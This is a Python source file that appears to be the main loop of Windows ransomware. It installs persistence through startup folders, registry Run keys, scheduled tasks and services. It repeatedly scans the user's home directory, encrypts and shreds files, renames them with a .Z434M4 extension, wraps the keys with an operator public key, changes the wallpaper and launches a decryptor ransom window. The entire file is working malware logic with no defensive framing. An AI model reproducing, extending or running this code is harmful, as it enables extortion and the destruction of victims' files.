import generate_keys
import asymmetric
import get_files
import symmetric
import environment
import variables
import persistence
import utils

import os
import string
import random
import time
import gc
import base64
import pickle
import subprocess
import ctypes
from pathlib import Path

# Update imports to use cryptography instead of pycrypto
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes

# Read client public key
try:
    with open(variables.client_public_key_path, 'rb') as f:
        client_public_key = f.read()
    client_public_key_obj = serialization.load_pem_public_key(client_public_key)
except Exception as e:
    print(f"Error loading public key: {str(e)}")


def get_paths():
    """Get encrypted file paths from stored data"""
    with open(variables.aes_encrypted_keys_path) as f:
        content = f.read().split("\n")
    
    for aes_and_path in content:
        if aes_and_path:  # Skip empty lines
            parts = aes_and_path.split(" ")
            if len(parts) > 1:
                yield parts[1]


def open_decryptor():
    """Check if decryptor is running, launch if not"""
    # Windows version of process checking
    running = False
    try:
        # Check if decryptor is running using tasklist
        result = subprocess.run("tasklist /FI \"IMAGENAME eq decryptor.exe\"", 
                              shell=True, capture_output=True, text=True)
        if "decryptor.exe" in result.stdout:
            running = True
    except Exception:
        pass
    
    if running:
        return
    
    # Launch decryptor with hidden console
    try:
        # Change to ransomware directory
        os.chdir(variables.ransomware_path)
        # Start decryptor window - several methods for Windows
        # Method 1: Direct execution
        subprocess.Popen([variables.decryptor_path], 
                       shell=True, 
                       creationflags=subprocess.CREATE_NEW_CONSOLE)
        
        # Method 2: Use start command (Windows specific)
        subprocess.Popen(f'start "" "{variables.decryptor_path}"', 
                       shell=True)
    except Exception as e:
        print(f"Error launching decryptor: {str(e)}")


def start_encryption(files):
    """Encrypt newly found files"""
    if not files:
        return None

    for found_file in files:
        try:
            key = generate_keys.generate_key(128, True)
            AES_obj = symmetric.AESCipher(key)
            
            found_file = base64.b64decode(found_file)
            with open(found_file, 'rb') as f:
                file_content = f.read()
            
            encrypted = AES_obj.encrypt(file_content)
            utils.shred(found_file)

            # Use .Z434M4 extension for consistency
            new_file_name = found_file + b".Z434M4"
            with open(new_file_name, 'wb') as f:
                f.write(encrypted)

            yield (key, base64.b64encode(new_file_name))
        except Exception as e:
            print(f"Error encrypting file: {str(e)}")
            continue

def menu():
    """Main encryption function that finds and encrypts new files"""
    new_files = get_files.find_files(os.path.expanduser('~'))  # Use Windows home dir
    aes_keys_and_base64_path = start_encryption(new_files)

    if aes_keys_and_base64_path:
        # Ensure the directory exists
        os.makedirs(os.path.dirname(variables.aes_encrypted_keys_path), exist_ok=True)
        
        with open(variables.aes_encrypted_keys_path, 'a') as f:    
            for _ in aes_keys_and_base64_path:
                # Encrypt AES key with client's public key
                encrypted_aes_key = client_public_key_obj.encrypt(
                    _[0],
                    padding.OAEP(
                        mgf=padding.MGF1(algorithm=hashes.SHA256()),
                        algorithm=hashes.SHA256(),
                        label=None
                    )
                )
                
                f.write(base64.b64encode(encrypted_aes_key).decode('utf-8') + " " + _[1].decode('utf-8') + "\n")

        aes_keys_and_base64_path = None
        del aes_keys_and_base64_path
        gc.collect()


def persist():
    """Apply all persistence methods for Windows"""
    persistence.startup()       # Windows Startup folder
    persistence.bashrcs()       # Windows Registry Run keys
    persistence.crontab()       # Windows Scheduled Tasks
    if utils.amiroot():
        persistence.systemctl() # Windows Services (requires admin)


if __name__ == "__main__":
    # Apply persistence mechanisms
    persist()
    
    # Main loop
    while True:
        try:
            # Check for new files to encrypt
            menu()
            # Change wallpaper periodically
            utils.change_wallpaper()
            # Launch decryptor interface
            open_decryptor()
            # Wait before next scan
            time.sleep(30)
        except Exception as e:
            # Silently ignore errors to keep daemon running
            pass